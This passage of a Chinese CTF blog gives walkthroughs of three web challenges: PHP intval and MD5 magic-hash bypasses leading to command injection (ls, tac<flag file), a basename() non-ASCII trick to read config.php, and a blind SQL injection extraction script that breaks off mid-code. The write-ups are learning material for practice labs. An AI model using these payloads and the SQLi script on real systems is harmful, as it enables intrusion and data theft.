<p>将代码复制，整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//level 1  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123; <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123; </span><br><span class="line">	<span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];  </span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))  </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">	   <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//get flag  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123; <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123; <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>; system(<span class="variable">$get_flag</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里有3个if语句，只有最后一个才能输出flag。但是，如果不满足前面2个if语句，就会因为<code>die</code>，而直接退出程序。因此，要同时满足3个if才可以得到flag。</p>
<h2 id="intval函数绕过">intval函数绕过</h2>
<p>需要以GET方式传入一个参数<code>num</code>，并且要满足 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span></span><br></pre></td></tr></table></figure></p>
<p><code>intval</code>函数的作用是取该数字的整数部分。也就是一个数的整数部分要小于2020，但是加1之后要大于2021，这里面的跨度大于1，因此正常的一个数字是不可能实现的，因此一定存在某种绕过方法。</p>
<p>通过搜素，得到下面结果<a href="https://www.runoob.com/php/php-intval-function.html">intval</a>： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>); <span class="comment">// 4 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;42&#x27;</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;+42&#x27;</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;-42&#x27;</span>); <span class="comment">// -42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>); <span class="comment">// 34 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;042&#x27;</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>); <span class="comment">// 10000000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;1e10&#x27;</span>); <span class="comment">// 1 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>); <span class="comment">// 26 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>); <span class="comment">// 42000000 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>); <span class="comment">// 0 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;420000000000000000000&#x27;</span>); <span class="comment">// 2147483647，32位os最大整数值</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>, <span class="number">8</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;42&#x27;</span>, <span class="number">8</span>); <span class="comment">// 34 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>()); <span class="comment">// 0 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>)); <span class="comment">// 1 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>需要注意的是<code>intval(1e10)</code>和<code>intval('1e10')</code>，前者被当作数字，因此结果为10的10次方，而后者被当作字符串，因此取最前面的有效数字，结果位1。</p>
<p>但是，如果是<code>'1e10'+1</code>呢？</p>
<p>在PHP中，字符串和数字相加的时候也是先将字符串转为数字（取最开始的有效数字），然后再相加。但是有例外，就是<code>1e</code>开头（只要最开始是数字，然后跟一个e即可），且后面位纯数字的字符串，这回被PHP当作是科学计数法的数字。</p>
<p>此时来回答<code>'1e10'+1</code>。根据上面的说明，那么这个执行的结果为<code>10000000001</code>。</p>
<p>可以利用这个特性传入<code>'2e4'</code>，此时 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">intval(<span class="string">&#x27;2e4&#x27;</span>) = <span class="number">2</span> &lt; <span class="number">2020</span></span><br><span class="line">intval(<span class="string">&#x27;2e4&#x27;</span> + <span class="number">1</span>) = <span class="number">20001</span> &gt; <span class="number">2021</span></span><br></pre></td></tr></table></figure></p>
<p>因此payload如下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=&#x27;2e4&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407133950.png" /></p>
<p>发现并没有绕过，猜测可能后台代码默认将我们的输入转为了字符串。因此，尝试 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=2e4</span><br></pre></td></tr></table></figure></p>
<p>此时，成功绕过！</p>
<h2 id="md5-弱类型比较绕过">MD5 弱类型比较绕过</h2>
<p>需要以GET方式传入参数<code>md5</code>，并且满足： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$md5</span>==md5(<span class="variable">$md5</span>)</span><br></pre></td></tr></table></figure></p>
<p>与上题的原理类似。如果<code>$md5=0e[后面是纯数字]</code>，并且<code>md5($md5)=0e[后面是纯数字]</code>，那么此时两者进行比较的流程：</p>
<ol type="1">
<li>会被当作是科学计数法表示的数字，因为0的几次方都是0，因此两边的值都是0</li>
<li><code>0==0</code> 结果为True</li>
</ol>
<p>写一个脚本跑一下满足这种条件的值： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">    valBase = <span class="string">&#x27;0e&#x27;</span>  </span><br><span class="line">    val = valBase + <span class="built_in">str</span>(i)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;checking <span class="subst">&#123;val&#125;</span> now:&quot;</span>, end=<span class="string">&#x27;\t&#x27;</span>)  </span><br><span class="line">    h = hashlib.md5()  </span><br><span class="line">    h.update(val.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">    valMD5 = h.hexdigest()  </span><br><span class="line">    <span class="keyword">if</span> valMD5[<span class="number">0</span>:<span class="number">2</span>] == valBase <span class="keyword">and</span> (valMD5[<span class="number">2</span>:]).isdigit():  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nfind it! val: &quot;</span> + val)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;And md5(val): &quot;</span> + valMD5)  </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;No!&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>结果为<code>0e215962017</code>，所以输入如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017</span><br></pre></td></tr></table></figure></p>
<p>成功绕过第二个if！</p>
<h2 id="命令执行">命令执行</h2>
<p>需要以GET方式传入参数<code>get_flag</code>，并且要满足： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>) 为 真</span><br></pre></td></tr></table></figure></p>
<p>并且<code>cat</code>被过滤了。也就是我们输入的命令不能带有空格和<code>cat</code>。这其实比较容易。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017&amp;get_flag=ls # 查看当前目录文件</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407135323.png" /></p>
<p>flag应该就在那个巨长的名字的文件里面。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017&amp;get_flag=tac&lt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag # 读取flag</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407135447.png" /></p>
<h1 id="总结">总结</h1>
<p>本题其实考场的就是PHP中科学计数法的数字和字符串的关系。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>PHP之科学计数法</tag>
      </tags>
  </entry>
  <entry>
    <title>Zer0pts2020 Can you guess it</title>
    <url>/2022/04/24/Zer0pts2020%20Can%20you%20guess%20it/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">Can you guess it?</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境之后，点击Source得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="解题">2. 解题</h1>
<p>乍一看，有两个突破点：</p>
<ol type="1">
<li><p>通过highlight_file()函数，把confi.php当作参数即可；</p></li>
<li><p>绕过hash_equals()，从而输出flag；</p></li>
</ol>
<p>但是，经过分析，第二点无法突破，<code>$secret</code>是随机的，hash_equals不像其他函数可以通过数组这些绕过。因此，目光回到第一点。</p>
<p>首先，假设我们的url为: <code>http://hostname/test/index.php?source=balabala</code>，那么<code>$_SERVER['PHP_SELF'])</code>的返回结果就是/test/index.php；<code>basename($_SERVER['PHP_SELF'])</code>返回的结果就是index.php。</p>
<p>乍一看很完美，没有漏洞可言，但是basename有一个小问题，那就是如果地址中文件的后面出现非ascii码的特殊字符（不在ASCII码中），那么basename就会当作没看见。比如这样的url: <code>http://hostname/test/basename.php/%81?source=balabala</code>（这里的%81值得是16进制的81，而ascii码最大就到7f，因此已经超过），那么此时，basename眼中的url为<code>http://hostname/test/basename.php/?source=balabala</code>，因此最终返回的结果就是basename.php。</p>
<p>我在自己的主机上编写了如下代码做测试： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test/basename.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span>(basename(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>正常的url: <code>/test/basename.php/config.php?source=balabla</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424232954.png" /></p>
<p>如果url为: <code>/test/basename.php/config.php/%81?source=balabla</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424233105.png" /></p>
<p>知道了前置知识后就简单了。</p>
<p>首先我们要绕过正则匹配，其实只要<code>$_SERVER['PHP_SELF']</code>的值不以config.php结尾即可，因此只要在config.php后面随便加点什么就行了。又因为经过basename函数最终的结果要为config.php，所以最终的payload为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/config.php/%81?source</span><br></pre></td></tr></table></figure></p>
<p>其实%80也可以，但是本地测试的时候是不行的，不知道什么原因。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424233512.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>PHP知识</tag>
        <tag>basename绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>WUSTCTF2020 颜值成绩查询</title>
    <url>/2022/04/22/WUSTCTF2020%20%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BWUSTCTF2020%5D%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2">WUSTCTF2020 颜值成绩查询</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境，得到一个登录界面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422105804.png" /></p>
<p>分别输入如下值时，页面出现了不一样： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=1 # Hi admin, your score is: 100</span><br><span class="line">1=2 # student number not exists.</span><br></pre></td></tr></table></figure></p>
<p>因此确定这里存在sql注入，并且没有闭合方式！</p>
<h1 id="解题">2. 解题</h1>
<p>首先fuzz了一波，发现什么都没有过滤，但是有时候加空格却不行，有时候加空格确可以，比如： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0^(length((select (flag) from(flag)))&gt;0) # 可以</span><br><span class="line">0^(length((select flag from(flag)))&gt;0) # 不行</span><br></pre></td></tr></table></figure></p>
<p>以防万一，我就都用括号代替。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求数据库长度  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lenOfdb</span>(<span class="params">url</span>):</span>  </span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span>  </span><br><span class="line">    payload = <span class="string">&#x27;?stunum=0^(length(database())=%d)&#x27;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function lenOfdb is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">        finUrl = url + (payload % i)  </span><br><span class="line">        <span class="comment"># print(finUrl)  </span></span><br><span class="line">        r = requests.get(finUrl)  </span><br><span class="line">        time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">        <span class="comment"># print(r.text)  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success! the len of db is %d&quot;</span> % i)  </span><br><span class="line">            <span class="built_in">len</span> = i  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求数据库名字  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbName</span>(<span class="params">url, <span class="built_in">len</span></span>):</span>  </span><br><span class="line">    db = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    payload = <span class="string">&#x27;?stunum=0^(ascii(substr(database(),%d,1))=%d)&#x27;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function dbName is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>+<span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):  </span><br><span class="line">            finUrl = url + (payload % (i, j))  </span><br><span class="line">            <span class="comment"># print(finUrl)  </span></span><br><span class="line">            r = requests.get(finUrl)  </span><br><span class="line">            time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">            <span class="comment"># print(r.text)  </span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of database&#x27;s name is : &quot;</span> + <span class="built_in">chr</span>(j))  </span><br><span class="line">                db += <span class="built_in">chr</span>(j)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success! the database&#x27;s name is : &quot;</span> + db )  </span><br><span class="line">    <span class="keyword">return</span> db  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求数据库下group_concat(table_name)的长度  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tablesLen</span>(<span class="params">url, dbname</span>):</span>  </span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;%s&#x27;)))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function tablesLen is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">        finUrl = url + (payload % (dbname, i))  </span><br><span class="line">        r = requests.get(finUrl)  </span><br><span class="line">        time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success! the length of group_concat(table_name) is : %d&quot;</span> % i)  </span><br><span class="line">            <span class="built_in">len</span> = i  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求数据库下group_concat(table_name)所有表的名称  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tablesName</span>(<span class="params">url, dbname, tableslen</span>):</span>  </span><br><span class="line">    tablesname = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;%s&#x27;)),%d,1))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function tablesName is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tableslen+<span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):  </span><br><span class="line">            finUrl = url + (payload % (dbname, i, j))  </span><br><span class="line">            <span class="comment"># print(finUrl)  </span></span><br><span class="line">            r = requests.get(finUrl)  </span><br><span class="line">            <span class="comment"># print(r.text)  </span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of tablesname is : &quot;</span> + <span class="built_in">chr</span>(j))  </span><br><span class="line">                tablesname += <span class="built_in">chr</span>(j)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success! the tablesName is : &quot;</span> + tablesname)  </span><br><span class="line">    <span class="keyword">return</span> tablesname  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求特定表下字段长度  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">columnsLen</span>(<span class="params">url, tablename</span>):</span>  </span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(length((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27;)))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function columnsLen is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">        finUrl = url + (payload % (tablename, i))  </span><br><span class="line">        <span class="comment"># print(finUrl)  </span></span><br><span class="line">        r = requests.get(finUrl)  </span><br><span class="line">        time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success! the len of columns is : %d&quot;</span> % i)  </span><br><span class="line">            <span class="built_in">len</span> = i  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求特定表下group_concat(column_name)的长度  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">columnsName</span>(<span class="params">url, tablename, columnlen</span>):</span>  </span><br><span class="line">    columnsname = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27;)),%d,1))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function columnsName is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, columnlen+<span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):  </span><br><span class="line">            finUrl = url + (payload % (tablename, i, j))  </span><br><span class="line">            r = requests.get(finUrl)  </span><br><span class="line">            time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of columnsname is : &quot;</span> + <span class="built_in">chr</span>(j))  </span><br><span class="line">                columnsname += <span class="built_in">chr</span>(j)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success! the columnsname is : %s&quot;</span> % columnsname)  </span><br><span class="line">    <span class="keyword">return</span> columnsname  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求特定表下特定字段的信息长度  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InfoLen</span>(<span class="params">url, tablename, columnname</span>):</span>  </span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(length((select(%s)from(%s)))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function Infolen is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">        finUrl = url + (payload % (columnname, tablename, i))  </span><br><span class="line">        <span class="comment"># print(finUrl)  </span></span><br><span class="line">        r = requests.get(finUrl)  </span><br><span class="line">        time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">        <span class="comment"># print(r.text)  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success! the len of Info is : %d&quot;</span> % i)  </span><br><span class="line">            <span class="built_in">len</span> = i  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求特定表下特定字段的信息  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInfo</span>(<span class="params">url, tablename, columnname, Infolen</span>):</span>  </span><br><span class="line">    Info = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(ascii(substr((select(%s)from(%s)),%d,1))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function getInfo is working!&quot;</span>)  </span><br><span class="line">    <span 